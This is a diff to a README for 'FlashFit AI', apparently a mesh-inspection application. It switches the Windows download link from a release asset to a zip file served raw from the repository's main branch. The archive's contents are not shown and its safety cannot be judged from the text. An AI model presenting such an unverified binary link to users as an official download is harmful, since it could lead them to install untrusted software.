@@ -8,7 +8,7 @@ The application inspects the actual mesh—including dimensions, topology, overh
 
 ## Official downloads
 
-- [Windows 11 x64 — FlashFit AI 4.2.1 Stability Fix Beta](https://github.com/alexmark53343-byte/FlashFit-AI/releases/download/v4.2.1-stability-fix-beta/FlashFit-AI-Windows-11-x64.zip)
+- [Windows 11 x64 — FlashFit AI 4.2.1 Stability Fix Beta](https://github.com/alexmark53343-byte/FlashFit-AI/raw/refs/heads/main/downloads/FlashFit-AI-Windows-11-x64.zip)
 - [macOS Apple Silicon — FlashFit AI 3.6 Beta](https://github.com/alexmark53343-byte/FlashFit-AI/releases/download/v3.6-beta/FlashFit-AI-Apple-Silicon.zip)
 
 ## Current release
